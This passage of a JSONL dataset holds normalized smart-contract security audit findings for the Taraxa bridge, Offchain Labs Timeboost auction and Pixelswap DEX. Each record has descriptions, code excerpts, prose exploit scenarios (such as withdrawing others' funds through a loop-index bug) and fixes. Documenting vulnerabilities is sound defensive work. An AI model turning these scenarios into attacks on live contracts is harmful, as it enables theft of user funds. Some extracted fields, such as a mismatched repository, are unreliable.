[NativeConnectorLogic.sol#L37-L54](https://github.com/Taraxa-project/bridge/blob/f82dd87c7e23358c74f7dc37451ca61110b60942/src/connectors/NativeConnectorLogic.sol#L37-L54)*\n\n## Recommendations\n\nShort term, replace the existing deduct-fee-from-msg.value with an amount argument in the lock function and a check: require(msg.value - amount == settlementFee).\n\n\nLong term, design functions so that they are simple and easy to use for external parties. This improves the usability and prevents confusion for integrators.\n", "severity": "Informational", "difficulty": "Low", "type": "Arithmetic", "finding_id": "TOB-TARA-7", "target": {"path": "bridge/src/lib/BridgeBase.sol", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/crytic/slither-action", "org": "crytic", "name": "slither-action", "commit": null, "branch": null, "relative_file": "bridge/src/lib/BridgeBase.sol", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-07-taraxa-bridge-smart-contracts-v2-securityreview.pdf", "source_mtime": "2025-11-01T20:47:29.319395+00:00", "report_extracted_at": "2025-11-12T02:10:17.697113+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:10:17.699214+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": "Low", "Type": "Arithmetic", "Finding ID": "TOB-TARA-7", "Target": "bridge/src/lib/BridgeBase.sol"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2024-08-offchainlabs-timeboost-auction-contracts-securityreview-001", "doc_id": "trailofbits_2024-08-offchainlabs-timeboost-auction-contracts-securityreview", "finding_index": 1, "page_start": 13, "title": "Bids cannot be resolved if reservePrice is zero", "short_summary": null, "description_md": "#### Description\n\nAuction resolution will revert if the reserve price is zero, blocking the express lane controller address from being assigned for that round.\n\nExpress lane controller selection is performed through a second-bid auction, where a privileged user will call the resolveSingleBidAuction or resolveMultiBidAuction function to resolve an auction using valid signatures from users willing to pay a particular amount.\n\n```\n/// @inheritdoc IExpressLaneAuction\n   function resolveSingleBidAuction(Bid calldata firstPriceBid)\n       External\n392 /// @inheritdoc IExpressLaneAuction\n393 function resolveSingleBidAuction(Bid calldata firstPriceBid)\n394 external\n395 onlyRole(AUCTIONEER_ROLE)\n...\n422 /// @inheritdoc IExpressLaneAuction\n423 function resolveMultiBidAuction(Bid calldata firstPriceBid, Bid calldata\nsecondPriceBid)\n424 external\n425 onlyRole(AUCTIONEER_ROLE)\n```\n\n*Figure 1.1: The headers of the functions used by the auctioneer to resolve auctions ([src/express-lane-auction/ExpressLaneAuction.sol#L392-L425](https://github.com/OffchainLabs/nitro-contracts/blob/9dc19d21c0ba0df89529cc0085915fa9565ecafd/src/express-lane-auction/ExpressLaneAuction.sol#L392-L425))*\n\nWhen an auction is resolved, the price paid for the bid is taken from the balance of the bidder:\n\n```\n308 function resolveAuction(\n309 bool isMultiBid,\n310 Bid calldata firstPriceBid,\n311 address firstPriceBidder,\n312 uint256 priceToPay,\n```\n\n\n```\n313 uint64 biddingInRound,\n314 uint64 roundStart,\n315 uint64 roundEnd\n316 ) internal {\n317 // store that a round has been resolved\n318 uint64 biddingForRound = biddingInRound + 1;\n319 latestResolvedRounds.setResolvedRound(biddingForRound,\nfirstPriceBid.expressLaneController);\n320\n321 // first price bidder pays the beneficiary\n322 _balanceOf[firstPriceBidder].reduce(priceToPay, biddingInRound);\n```\n\n*Figure 1.2: A snippet of the resolveAuction function showing the price being deducted from the winning bidder's balance*\n\n*([src/express-lane-auction/ExpressLaneAuction.sol#L308-L322](https://github.com/OffchainLabs/nitro-contracts/blob/9dc19d21c0ba0df89529cc0085915fa9565ecafd/src/express-lane-auction/ExpressLaneAuction.sol#L308-L322))*\n\nHowever, if the price to pay is zero, the balance reduction will revert.\n\n```\n77 function reduce(\n78 Balance storage bal,\n79 uint256 amount,\n80 uint64 round\n81 ) internal {\n82 if (amount == 0) {\n83 revert ZeroAmount();\n84 }\n```\n\n*Figure 1.3: A snippet of the reduce library function that expects a non-zero deduction ([src/express-lane-auction/Balance.sol#L77-L84](https://github.com/OffchainLabs/nitro-contracts/blob/9dc19d21c0ba0df89529cc0085915fa9565ecafd/src/express-lane-auction/Balance.sol#L77-L84))*\n", "full_markdown": "| 1. Bids cannot be resolved if reservePrice is zero |                         |\n|----------------------------------------------------------------------------|-------------------------|\n| Severity: Medium                                                        | Diffi culty: High |\n| Type: Data Validation Finding ID: TOB-ELA-1                 |                         |\n| Target: src/express-lane-auction/Balance.sol                            |                         |\n\n#### Description\n\nAuction resolution will revert if the reserve price is zero, blocking the express lane controller address from being assigned for that round.\n\nExpress lane controller selection is performed through a second-bid auction, where a privileged user will call the resolveSingleBidAuction or resolveMultiBidAuction function to resolve an auction using valid signatures from users willing to pay a particular amount.\n\n```\n/// @inheritdoc IExpressLaneAuction\n   function resolveSingleBidAuction(Bid calldata firstPriceBid)\n       External\n392 /// @inheritdoc IExpressLaneAuction\n393 function resolveSingleBidAuction(Bid calldata firstPriceBid)\n394 external\n395 onlyRole(AUCTIONEER_ROLE)\n...\n422 /// @inheritdoc IExpressLaneAuction\n423 function resolveMultiBidAuction(Bid calldata firstPriceBid, Bid calldata\nsecondPriceBid)\n424 external\n425 onlyRole(AUCTIONEER_ROLE)\n```\n\n*Figure 1.1: The headers of the functions used by the auctioneer to resolve auctions ([src/express-lane-auction/ExpressLaneAuction.sol#L392-L425](https://github.com/OffchainLabs/nitro-contracts/blob/9dc19d21c0ba0df89529cc0085915fa9565ecafd/src/express-lane-auction/ExpressLaneAuction.sol#L392-L425))*\n\nWhen an auction is resolved, the price paid for the bid is taken from the balance of the bidder:\n\n```\n308 function resolveAuction(\n309 bool isMultiBid,\n310 Bid calldata firstPriceBid,\n311 address firstPriceBidder,\n312 uint256 priceToPay,\n```\n\n\n```\n313 uint64 biddingInRound,\n314 uint64 roundStart,\n315 uint64 roundEnd\n316 ) internal {\n317 // store that a round has been resolved\n318 uint64 biddingForRound = biddingInRound + 1;\n319 latestResolvedRounds.setResolvedRound(biddingForRound,\nfirstPriceBid.expressLaneController);\n320\n321 // first price bidder pays the beneficiary\n322 _balanceOf[firstPriceBidder].reduce(priceToPay, biddingInRound);\n```\n\n*Figure 1.2: A snippet of the resolveAuction function showing the price being deducted from the winning bidder's balance*\n\n*([src/express-lane-auction/ExpressLaneAuction.sol#L308-L322](https://github.com/OffchainLabs/nitro-contracts/blob/9dc19d21c0ba0df89529cc0085915fa9565ecafd/src/express-lane-auction/ExpressLaneAuction.sol#L308-L322))*\n\nHowever, if the price to pay is zero, the balance reduction will revert.\n\n```\n77 function reduce(\n78 Balance storage bal,\n79 uint256 amount,\n80 uint64 round\n81 ) internal {\n82 if (amount == 0) {\n83 revert ZeroAmount();\n84 }\n```\n\n*Figure 1.3: A snippet of the reduce library function that expects a non-zero deduction ([src/express-lane-auction/Balance.sol#L77-L84](https://github.com/OffchainLabs/nitro-contracts/blob/9dc19d21c0ba0df89529cc0085915fa9565ecafd/src/express-lane-auction/Balance.sol#L77-L84))*\n\n#### Exploit Scenario\n\nThe reserve price is set to zero and Alice is the sole bidder for a round. Since this is a second-price auction, she should pay the reserve price when the auction for this round is resolved. The auctioneer calls the resolveSingleBidAuction function and passes in Alice's bid. The call reverts when it attempts to deduct zero tokens from Alice's balance. As a result, no express lane controller can be assigned for that round.\n\n#### Recommendations\n\nShort term, consider allowing the reduce function to decrement zero.\n\nLong term, use fuzz testing to detect unexpected reverts caused by calling different functions of the smart contracts.\n\n### Fix Status\n\nResolved in PR [243](https://github.com/OffchainLabs/nitro-contracts/pull/243). The updated code allows for bids of zero tokens as long as the bidder has a non-zero balance.\n", "severity": "Medium", "difficulty": "High", "type": "Data Validation", "finding_id": "TOB-ELA-1", "target": {"path": "src/express-lane-auction/Balance.sol", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/OffchainLabs/nitro-contracts", "org": "OffchainLabs", "name": "nitro-contracts", "commit": "9dc19d21c0ba0df89529cc0085915fa9565ecafd", "branch": null, "relative_file": "src/express-lane-auction/Balance.sol", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-08-offchainlabs-timeboost-auction-contracts-securityreview.pdf", "source_mtime": "2025-11-01T12:04:43+00:00", "report_extracted_at": "2025-11-12T02:10:48.175428+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:10:48.176489+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Medium", "Difficulty": "High", "Type": "Data Validation", "Finding ID": "TOB-ELA-1", "Target": "src/express-lane-auction/Balance.sol"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2024-08-offchainlabs-timeboost-auction-contracts-securityreview-002", "doc_id": "trailofbits_2024-08-offchainlabs-timeboost-auction-contracts-securityreview", "finding_index": 2, "page_start": 15, "title": "Discrepancies in the structure and use of signatures between the specification and implementation", "short_summary": null, "description_md": "#### Description\n\nBids that are submitted to an express lane auction round include signatures that must be validated on-chain. While reviewing the specification and implementation, we identified several minor discrepancies between the documentation and the contract's use of signatures. These differences do not compromise the integrity of the signatures used by the system, but may result in integration issues for third parties attempting to bid.\n\nThe written specification defines a bid as containing \"(chainId, auctionContractAddress, roundNumber, bid, expressLaneControllerAddress, signature)\" and defines the signature as being \"signature by the bidder's private key on the tuple (chainId, auctionContractAddress, roundNumber, bid, expressLaneControllerAddress)\". A code comment in the IExpressLaneAuction contract further specifies an EIP-191 personal\\_sign message format for the signature using all of the fields mentioned above (though with the order of the last two fields swapped).\n\nHowever, the contract actually expects an EIP-712 signature with the chainId and auctionContractAddress in the domain separator, and the actual bid being constructed of the remaining three fields (again, with the order of the last two fields swapped relative to the specification), as shown in figure 2.1.\n\n```\n356 function getBidHash(\n357 uint64 round,\n358 address expressLaneController,\n359 uint256 amount\n360 ) public view returns (bytes32) {\n361 return\n362 _hashTypedDataV4(\n363 keccak256(abi.encode(BID_DOMAIN, round, expressLaneController,\namount))\n364 );\n365 }\n```\n\n*Figure 2.1: The getBidHash function definition showing the order of the bid parameters [src/express-lane-auction/ExpressLaneAuction.sol#L356-L365](https://github.com/OffchainLabs/nitro-contracts/blob/9dc19d21c0ba0df89529cc0085915fa9565ecafd/src/express-lane-auction/ExpressLaneAuction.sol#L356-L365)*\n\n\nThis also has trickle-down effects on how ties will be broken by the contract. The specification states that if the top two bidders submit bids with identical amounts, then \"the tie is broken by hashing the bidder address concatenated with the respective byte-string representation of the bid using the Keccak256 hashing scheme.\" However, since the contract considers a bid to be constructed differently than the specification, the outcome of the tie breaking process will differ. Additionally, rather than concatenating the bidder's address with the full byte-string representation of the bid, the contract uses a hash of the bid (figure 2.2).\n\n```\n460 // when bids have the same amount we break ties based on the bid hash\n461 // although we include equality in the check we know this isnt possible due\n462 // to the check above that ensures the first price bidder and second price\nbidder are different\n463 if (\n464 firstPriceBid.amount == secondPriceBid.amount &&\n465 uint256(keccak256(abi.encodePacked(firstPriceBidder, firstBidHash))) <\n466 uint256(keccak256(abi.encodePacked(secondPriceBidder, secondBidHash)))\n467 ) {\n468 revert TieBidsWrongOrder();\n469 }\n```\n\n*Figure 2.2: A portion of the resolveMultiBidAuction function body showing the tie breaking logic [src/express-lane-auction/ExpressLaneAuction.sol#L460-L469](https://github.com/OffchainLabs/nitro-contracts/blob/9dc19d21c0ba0df89529cc0085915fa9565ecafd/src/express-lane-auction/ExpressLaneAuction.sol#L460-L469)*\n", "full_markdown": "### 2. Discrepancies in the structure and use of signatures between the specification and implementation\n\n| Severity: Informational                                 | Diffi culty: Low      |\n|------------------------------------------------------------|-----------------------------|\n| Type: Data Validation                                | Finding ID: TOB-ELA-2 |\n| Target: src/express-lane-auction/ExpressLaneAuction.sol |                             |\n\n#### Description\n\nBids that are submitted to an express lane auction round include signatures that must be validated on-chain. While reviewing the specification and implementation, we identified several minor discrepancies between the documentation and the contract's use of signatures. These differences do not compromise the integrity of the signatures used by the system, but may result in integration issues for third parties attempting to bid.\n\nThe written specification defines a bid as containing \"(chainId, auctionContractAddress, roundNumber, bid, expressLaneControllerAddress, signature)\" and defines the signature as being \"signature by the bidder's private key on the tuple (chainId, auctionContractAddress, roundNumber, bid, expressLaneControllerAddress)\". A code comment in the IExpressLaneAuction contract further specifies an EIP-191 personal\\_sign message format for the signature using all of the fields mentioned above (though with the order of the last two fields swapped).\n\nHowever, the contract actually expects an EIP-712 signature with the chainId and auctionContractAddress in the domain separator, and the actual bid being constructed of the remaining three fields (again, with the order of the last two fields swapped relative to the specification), as shown in figure 2.1.\n\n```\n356 function getBidHash(\n357 uint64 round,\n358 address expressLaneController,\n359 uint256 amount\n360 ) public view returns (bytes32) {\n361 return\n362 _hashTypedDataV4(\n363 keccak256(abi.encode(BID_DOMAIN, round, expressLaneController,\namount))\n364 );\n365 }\n```\n\n*Figure 2.1: The getBidHash function definition showing the order of the bid parameters [src/express-lane-auction/ExpressLaneAuction.sol#L356-L365](https://github.com/OffchainLabs/nitro-contracts/blob/9dc19d21c0ba0df89529cc0085915fa9565ecafd/src/express-lane-auction/ExpressLaneAuction.sol#L356-L365)*\n\n\nThis also has trickle-down effects on how ties will be broken by the contract. The specification states that if the top two bidders submit bids with identical amounts, then \"the tie is broken by hashing the bidder address concatenated with the respective byte-string representation of the bid using the Keccak256 hashing scheme.\" However, since the contract considers a bid to be constructed differently than the specification, the outcome of the tie breaking process will differ. Additionally, rather than concatenating the bidder's address with the full byte-string representation of the bid, the contract uses a hash of the bid (figure 2.2).\n\n```\n460 // when bids have the same amount we break ties based on the bid hash\n461 // although we include equality in the check we know this isnt possible due\n462 // to the check above that ensures the first price bidder and second price\nbidder are different\n463 if (\n464 firstPriceBid.amount == secondPriceBid.amount &&\n465 uint256(keccak256(abi.encodePacked(firstPriceBidder, firstBidHash))) <\n466 uint256(keccak256(abi.encodePacked(secondPriceBidder, secondBidHash)))\n467 ) {\n468 revert TieBidsWrongOrder();\n469 }\n```\n\n*Figure 2.2: A portion of the resolveMultiBidAuction function body showing the tie breaking logic [src/express-lane-auction/ExpressLaneAuction.sol#L460-L469](https://github.com/OffchainLabs/nitro-contracts/blob/9dc19d21c0ba0df89529cc0085915fa9565ecafd/src/express-lane-auction/ExpressLaneAuction.sol#L460-L469)*\n\n#### Recommendations\n\nShort term, update the specification to match the implemented behavior.\n\nLong term, review the Arbitrum-related specifications across components and resolve any discrepancies.\n\n### Fix Status\n\nUnresolved.\n", "severity": "Informational", "difficulty": "Low", "type": "Data Validation", "finding_id": "TOB-ELA-2", "target": {"path": "src/express-lane-auction/ExpressLaneAuction.sol", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/OffchainLabs/nitro-contracts", "org": "OffchainLabs", "name": "nitro-contracts", "commit": "9dc19d21c0ba0df89529cc0085915fa9565ecafd", "branch": null, "relative_file": "src/express-lane-auction/ExpressLaneAuction.sol", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-08-offchainlabs-timeboost-auction-contracts-securityreview.pdf", "source_mtime": "2025-11-01T12:04:43+00:00", "report_extracted_at": "2025-11-12T02:10:48.175428+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:10:48.176489+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": "Low", "Type": "Data Validation", "Finding ID": "TOB-ELA-2", "Target": "src/express-lane-auction/ExpressLaneAuction.sol"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2024-08-offchainlabs-timeboost-auction-contracts-securityreview-003", "doc_id": "trailofbits_2024-08-offchainlabs-timeboost-auction-contracts-securityreview", "finding_index": 3, "page_start": 17, "title": "No way to burn auction proceeds", "short_summary": null, "description_md": "#### Description\n\nAccording to the Timeboost specification, after deducting the funds from the highest bidder, the contract should \"transfer those funds to a beneficiary account designated by governance, or burn them if governance specifies that the proceeds are to be burned.\" However, the contract does not include any mechanism to signal that the proceeds should be burned either at the time of auction resolution or when the funds are later transferred out of the contract. At the time of auction resolution, the funds are escrowed in an internal beneficiary account (figure 3.1) that can be emptied at a later date.\n\n```\n308 function resolveAuction(\n309 bool isMultiBid,\n310 Bid calldata firstPriceBid,\n311 address firstPriceBidder,\n312 uint256 priceToPay,\n313 uint64 biddingInRound,\n314 uint64 roundStart,\n315 uint64 roundEnd\n316 ) internal {\n317 // store that a round has been resolved\n318 uint64 biddingForRound = biddingInRound + 1;\n319 latestResolvedRounds.setResolvedRound(biddingForRound,\nfirstPriceBid.expressLaneController);\n320\n321 // first price bidder pays the beneficiary\n322 _balanceOf[firstPriceBidder].reduce(priceToPay, biddingInRound);\n323 beneficiaryBalance += priceToPay;\n```\n\n*Figure 3.1: A snippet of the resolveAuction function definition showing the proceeds being escrowed ([src/express-lane-auction/ExpressLaneAuction.sol#L308-L323](https://github.com/OffchainLabs/nitro-contracts/blob/9dc19d21c0ba0df89529cc0085915fa9565ecafd/src/express-lane-auction/ExpressLaneAuction.sol#L308-L323))*\n\nThe only way to access the beneficiary account is via the flushBeneficiaryBalance function (figure 3.2). Any user can call this function, which will transfer the entire beneficiary balance to the currently designated beneficiary address.\n\n```\n291 function flushBeneficiaryBalance() public {\n292 uint256 bal = beneficiaryBalance;\n293 if (bal == 0) {\n```\n\n\n```\n294 revert ZeroAmount();\n295 }\n296 beneficiaryBalance = 0;\n297 biddingToken.safeTransfer(beneficiary, bal);\n298 }\n```\n\n*Figure 3.2: The flushBeneficiaryBalance function ([src/express-lane-auction/ExpressLaneAuction.sol#L291-L298](https://github.com/OffchainLabs/nitro-contracts/blob/9dc19d21c0ba0df89529cc0085915fa9565ecafd/src/express-lane-auction/ExpressLaneAuction.sol#L291-L298))*\n", "full_markdown": "| 3. No way to burn auction proceeds       |                        |\n|------------------------------------------------------------|------------------------|\n| Severity: Informational                                 | Diffi culty: Low |\n| Type: Data Validation Finding ID: TOB-ELA-3 |                        |\n| Target: src/express-lane-auction/ExpressLaneAuction.sol |                        |\n\n#### Description\n\nAccording to the Timeboost specification, after deducting the funds from the highest bidder, the contract should \"transfer those funds to a beneficiary account designated by governance, or burn them if governance specifies that the proceeds are to be burned.\" However, the contract does not include any mechanism to signal that the proceeds should be burned either at the time of auction resolution or when the funds are later transferred out of the contract. At the time of auction resolution, the funds are escrowed in an internal beneficiary account (figure 3.1) that can be emptied at a later date.\n\n```\n308 function resolveAuction(\n309 bool isMultiBid,\n310 Bid calldata firstPriceBid,\n311 address firstPriceBidder,\n312 uint256 priceToPay,\n313 uint64 biddingInRound,\n314 uint64 roundStart,\n315 uint64 roundEnd\n316 ) internal {\n317 // store that a round has been resolved\n318 uint64 biddingForRound = biddingInRound + 1;\n319 latestResolvedRounds.setResolvedRound(biddingForRound,\nfirstPriceBid.expressLaneController);\n320\n321 // first price bidder pays the beneficiary\n322 _balanceOf[firstPriceBidder].reduce(priceToPay, biddingInRound);\n323 beneficiaryBalance += priceToPay;\n```\n\n*Figure 3.1: A snippet of the resolveAuction function definition showing the proceeds being escrowed ([src/express-lane-auction/ExpressLaneAuction.sol#L308-L323](https://github.com/OffchainLabs/nitro-contracts/blob/9dc19d21c0ba0df89529cc0085915fa9565ecafd/src/express-lane-auction/ExpressLaneAuction.sol#L308-L323))*\n\nThe only way to access the beneficiary account is via the flushBeneficiaryBalance function (figure 3.2). Any user can call this function, which will transfer the entire beneficiary balance to the currently designated beneficiary address.\n\n```\n291 function flushBeneficiaryBalance() public {\n292 uint256 bal = beneficiaryBalance;\n293 if (bal == 0) {\n```\n\n\n```\n294 revert ZeroAmount();\n295 }\n296 beneficiaryBalance = 0;\n297 biddingToken.safeTransfer(beneficiary, bal);\n298 }\n```\n\n*Figure 3.2: The flushBeneficiaryBalance function ([src/express-lane-auction/ExpressLaneAuction.sol#L291-L298](https://github.com/OffchainLabs/nitro-contracts/blob/9dc19d21c0ba0df89529cc0085915fa9565ecafd/src/express-lane-auction/ExpressLaneAuction.sol#L291-L298))*\n\n#### Recommendations\n\nShort term, add functionality to explicitly signal that tokens should be burned, or update the specification to reflect that the currently implemented behavior is correct.\n\nLong term, review the Arbitrum-related specifications across components and resolve any discrepancies.\n\n### Fix Status\n\nResolved in PR [242](https://github.com/OffchainLabs/nitro-contracts/pull/242). The Offchain Labs team has added a new Burner contract that can be deployed if needed and set as the beneficiary in the event that governance decides to configure the system to burn auction proceeds.\n", "severity": "Informational", "difficulty": "Low", "type": "Data Validation", "finding_id": "TOB-ELA-3", "target": {"path": "src/express-lane-auction/ExpressLaneAuction.sol", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/OffchainLabs/nitro-contracts", "org": "OffchainLabs", "name": "nitro-contracts", "commit": "9dc19d21c0ba0df89529cc0085915fa9565ecafd", "branch": null, "relative_file": "src/express-lane-auction/ExpressLaneAuction.sol", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-08-offchainlabs-timeboost-auction-contracts-securityreview.pdf", "source_mtime": "2025-11-01T12:04:43+00:00", "report_extracted_at": "2025-11-12T02:10:48.175428+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:10:48.176489+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": "Low", "Type": "Data Validation", "Finding ID": "TOB-ELA-3", "Target": "src/express-lane-auction/ExpressLaneAuction.sol"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2024-12-pixelswap-dex-securityreview-001", "doc_id": "trailofbits_2024-12-pixelswap-dex-securityreview", "finding_index": 1, "page_start": 18, "title": "The BulkInternalTransfer receiver computes the wrong total amounts", "short_summary": null, "description_md": "#### Description\n\nThe BulkInternalTransfer receiver function of the PixelswapFundingWallet contract computes the wrong total amounts to spend by adding the amount of the first entry multiple times.\n\nIn the PixelswapFundingWallet contract, when a BulkInternalTransfer message is processed, a loop calculates the total amount of tokens to be spent from the wallet. However, the loop does not increase the index variable i, so the result values will be the amounts for the first entry times the total number of entries.\n\nConsequently, when the spend\\_wallet internal function is called, an incorrect balance will be deducted, or a panic will be raised if the balance is insufficient.\n\n#### **[Redacted]**\n\nAdditionally, the loop in the receiver for BulkInternalTransfer in the PixelswapFunding contract is correctly implemented, which can result in the sum of user balances not matching the balance of the PixelswapSettlement contract, allowing users to withdraw more than they own and incorrectly decreasing the balance of the sender.\n", "full_markdown": "| 1. The BulkInternalTransfer receiver computes the wrong total amounts |                             |\n|-----------------------------------------------------------------------------------------------|-----------------------------|\n| Severity: High                                                                             | Diffi culty: Low      |\n| Type: Data Validation                                                                   | Finding ID: TOB-PXL-1 |\n| Target: contracts/pixelswap_funding.tact                                                   |                             |\n\n#### Description\n\nThe BulkInternalTransfer receiver function of the PixelswapFundingWallet contract computes the wrong total amounts to spend by adding the amount of the first entry multiple times.\n\nIn the PixelswapFundingWallet contract, when a BulkInternalTransfer message is processed, a loop calculates the total amount of tokens to be spent from the wallet. However, the loop does not increase the index variable i, so the result values will be the amounts for the first entry times the total number of entries.\n\nConsequently, when the spend\\_wallet internal function is called, an incorrect balance will be deducted, or a panic will be raised if the balance is insufficient.\n\n#### **[Redacted]**\n\nAdditionally, the loop in the receiver for BulkInternalTransfer in the PixelswapFunding contract is correctly implemented, which can result in the sum of user balances not matching the balance of the PixelswapSettlement contract, allowing users to withdraw more than they own and incorrectly decreasing the balance of the sender.\n\n#### Exploit Scenario\n\nBob sends a BulkInternalTransfer message with three entries, the first of which has 0 token\\_amt and 0 ton\\_amt. Bob's funding wallet spends 0 of his tokens, but the master funding contract correctly adds funds to the receivers' wallets. Bob is able to withdraw funds that do not belong to him from the funding contract.\n\n#### Recommendations\n\nShort term, increment the index variable i in the loop.\n\nIn the long term, expand the test suite to implement test cases for bulk transfers and ensure that these tests also consider malicious inputs.\n\n\n\n#### **Fix Review Status**\n", "severity": "High", "difficulty": "Low", "type": "Data Validation", "finding_id": "TOB-PXL-1", "target": {"path": "contracts/pixelswap_funding.tact", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/nx-fi/pixelswap", "org": "nx-fi", "name": "pixelswap", "commit": "5c24e13fcae51b250bd70e0a812ce69a9b3dee4a", "branch": null, "relative_file": "contracts/pixelswap_funding.tact", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-12-pixelswap-dex-securityreview.pdf", "source_mtime": "2025-11-01T12:04:44+00:00", "report_extracted_at": "2025-11-12T02:12:15.739604+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:12:15.742950+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "High", "Difficulty": "Low", "Type": "Data Validation", "Finding ID": "TOB-PXL-1", "Target": "contracts/pixelswap_funding.tact"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2024-12-pixelswap-dex-securityreview-002", "doc_id": "trailofbits_2024-12-pixelswap-dex-securityreview", "finding_index": 2, "page_start": 20, "title": "Granting the role to the master funding contract on a funding wallet contract will result in draining the funding wallet balance", "short_summary": null, "description_md": "#### Description\n\nGranting the privileged role to the PixelswapFunding contract on a user-owned PixelswapFundingWallet contract will result in the user balance being spent even if the user is the recipient of the InternalTransfer message. This can drain the user's balance by repeatedly forwarding the InternalTransfer message between the funding wallet and the master contract.\n\nUsers have funding wallets to interact with the system. In these wallets, they are both owners and privileged users (they have a privileged role). Any user can grant the privileged role to an address on their funding wallets via the GrantRole message of the access control trait, as shown in figure 2.1:\n\n#### **[Redacted]**\n\nIf a user grants the privileged role to the master funding contract, then the InternalTransfer message receiver function will always execute the first if block for the messages sent from the master funding contract, as shown in figure 2.2:\n\n#### **[Redacted]**\n\nThis will spend the user's balance instead of adding funds to the user's wallet and send the same message to the master funding contract, which will then send it back to the user's funding wallet contract, and it will keep spending the user's balance repeatedly until the gas sent with the message is consumed.\n", "full_markdown": "# 2. Granting the role to the master funding contract on a funding wallet contract will result in draining the funding wallet balance\n\n| Severity: High                           | Diffi culty: High     |\n|---------------------------------------------|-----------------------------|\n| Type: Authentication                     | Finding ID: TOB-PXL-2 |\n| contracts/pixelswap_funding.tact Target: |                             |\n\n#### Description\n\nGranting the privileged role to the PixelswapFunding contract on a user-owned PixelswapFundingWallet contract will result in the user balance being spent even if the user is the recipient of the InternalTransfer message. This can drain the user's balance by repeatedly forwarding the InternalTransfer message between the funding wallet and the master contract.\n\nUsers have funding wallets to interact with the system. In these wallets, they are both owners and privileged users (they have a privileged role). Any user can grant the privileged role to an address on their funding wallets via the GrantRole message of the access control trait, as shown in figure 2.1:\n\n#### **[Redacted]**\n\nIf a user grants the privileged role to the master funding contract, then the InternalTransfer message receiver function will always execute the first if block for the messages sent from the master funding contract, as shown in figure 2.2:\n\n#### **[Redacted]**\n\nThis will spend the user's balance instead of adding funds to the user's wallet and send the same message to the master funding contract, which will then send it back to the user's funding wallet contract, and it will keep spending the user's balance repeatedly until the gas sent with the message is consumed.\n\n### Exploit Scenario\n\nAlice accidentally grants the privileged role to the master funding contract on her funding wallet. From then on, any internal transfer she receives will not be accrued to her wallet and will drain her wallet balance.\n\n\n\n#### Recommendations\n\nShort term, review the order in which the checks are performed to ensure that even if the funding contract is privileged, it does not affect the expected outcome of the process. Also, consider limiting accounts that can get privileged roles in each system contract.\n\nLong term, identify and document all possible actions that privileged accounts can take, along with their associated risks. This will facilitate codebase reviews and prevent future mistakes.\n\n#### **Fix Review Status**\n", "severity": "High", "difficulty": "High", "type": "Authentication", "finding_id": "TOB-PXL-2", "target": {"path": "contracts/pixelswap_funding.tact", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/nx-fi/pixelswap", "org": "nx-fi", "name": "pixelswap", "commit": "5c24e13fcae51b250bd70e0a812ce69a9b3dee4a", "branch": null, "relative_file": "contracts/pixelswap_funding.tact", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-12-pixelswap-dex-securityreview.pdf", "source_mtime": "2025-11-01T12:04:44+00:00", "report_extracted_at": "2025-11-12T02:12:15.739604+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": 